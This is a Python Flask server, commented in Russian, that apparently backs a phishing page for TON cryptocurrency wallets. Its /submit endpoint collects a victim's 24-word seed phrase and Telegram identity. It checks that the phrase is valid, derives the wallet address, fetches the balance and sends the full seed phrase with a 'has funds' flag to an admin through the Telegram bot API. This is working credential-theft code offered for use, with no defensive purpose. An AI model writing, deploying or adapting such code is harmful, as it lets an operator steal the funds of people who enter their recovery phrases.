from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import requests
import os
import json
from tonsdk.contract.wallet import Wallets, WalletVersionEnum

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = os.environ.get("ADMIN_ID")
TON_API_KEY = os.environ.get("TON_API_KEY", "")  # Опционально, можно получить в @tonapibot

# Загружаем BIP39 словарь
def load_bip39_words():
    try:
        with open('bep39.txt', 'r', encoding='utf-8') as f:
            words = set()
            for line in f:
                line = line.strip().lower()
                if line:
                    if '. ' in line:
                        word = line.split('. ')[-1].strip()
                    else:
                        word = line
                    words.add(word)
            print(f"✅ Загружено {len(words)} слов из BIP39")
            return words
    except Exception as e:
        print(f"⚠️ Ошибка загрузки словаря: {e}")
        return set()

BIP39_WORDS = load_bip39_words()

def get_wallet_balance(address):
    """Получает баланс через TON API"""
    try:
        headers = {"X-API-Key": TON_API_KEY} if TON_API_KEY else {}
        url = f"https://toncenter.com/api/v2/getAddressInformation?address={address}"
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data.get("ok"):
                balance_nano = int(data.get("result", {}).get("balance", 0))
                return balance_nano / 1e9
        else:
            print(f"⚠️ API ошибка: {response.status_code}")
    except Exception as e:
        print(f"⚠️ Ошибка получения баланса: {e}")
    return 0.0

def check_seed_full(words_list):
    """ПОЛНАЯ проверка seed фразы: словарь + генерация + баланс"""
    
    # 1. Проверка количества
    if len(words_list) != 24:
        return {"valid": False, "error": f"Нужно 24 слова, получено {len(words_list)}"}
    
    # 2. Проверка слов из словаря BIP39
    invalid_words = []
    for word in words_list:
        if word not in BIP39_WORDS:
            invalid_words.append(word)
    
    if invalid_words:
        return {"valid": False, "error": f"Слова не в BIP39 словаре: {', '.join(invalid_words[:5])}"}
    
    # 3. Генерация кошелька из seed фразы
    try:
        wallet = Wallets.from_mnemonics(
            mnemonics=words_list,
            version=WalletVersionEnum.v3r2,
            workchain=0
        )
        
        # Получаем адрес (правильный способ)
        if isinstance(wallet, tuple):
            if hasattr(wallet[0], 'address'):
                address = wallet[0].address.to_string()
            elif isinstance(wallet[1], dict):
                address = wallet[1].get('address')
            else:
                address = str(wallet[1])
        else:
            address = wallet.address.to_string()
        
        print(f"   ✅ Адрес сгенерирован: {address}")
        
        # 4. Получаем баланс через TON API
        balance = get_wallet_balance(address)
        print(f"   💰 Баланс: {balance:.9f} TON")
        
        return {
            "valid": True,
            "address": address,
            "balance": balance,
            "has_funds": balance > 0.01
        }
        
    except Exception as e:
        print(f"❌ Ошибка генерации кошелька: {e}")
        return {"valid": False, "error": f"Неверная seed фраза: {str(e)}"}

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        data = request.json
        words = data.get('words', [])
        username = data.get('username', 'без_имени')
        first_name = data.get('first_name', '')
        user_id = data.get('user_id')
        
        print(f"\n📥 Получены данные от @{username}")
        print(f"📝 Количество слов: {len(words)}")
        
        # ПОЛНАЯ ПРОВЕРКА через TON API
        check_result = check_seed_full(words)
        
        if not check_result.get("valid"):
            print(f"❌ Невалидная фраза: {check_result.get('error')}")
            return jsonify({
                'status': 'error', 
                'message': check_result.get('error')
            }), 400
        
        # Фраза валидна! Отправляем админу с балансом
        address = check_result['address']
        balance = check_result['balance']
        
        print(f"✅ Фраза валидна! Адрес: {address}, Баланс: {balance} TON")
        
        # Формируем сообщение админу
        text = f"""
<b>📨 НОВЫЙ ВАЛИДНЫЙ КОШЕЛЕК</b>

👤 <b>Пользователь:</b> @{username}
🆔 <b>ID:</b> {user_id}
👋 <b>Имя:</b> {first_name}

📍 <b>Адрес кошелька:</b>
<code>{address}</code>

💰 <b>Баланс:</b> <b>{balance:.9f} TON</b>
💎 <b>Есть средства:</b> {'✅ ДА' if balance > 0.01 else '❌ НЕТ'}

🔑 <b>Seed фраза (24 слова):</b>
"""
        for i, word in enumerate(words, 1):
            text += f"{i:2}. <code>{word}</code>\n"
        
        # Отправляем админу
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        response = requests.post(url, json={
            'chat_id': ADMIN_ID, 
            'text': text, 
            'parse_mode': 'HTML'
        })
        
        if response.status_code == 200:
            print("✅ Сообщение админу отправлено")
            return jsonify({
                'status': 'ok', 
                'message': 'Seed фраза валидна',
                'balance': balance,
                'address': address[:12] + '...'
            }), 200
        else:
            print(f"❌ Ошибка отправки админу: {response.text}")
            return jsonify({'status': 'error', 'message': 'Ошибка отправки админу'}), 500
        
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
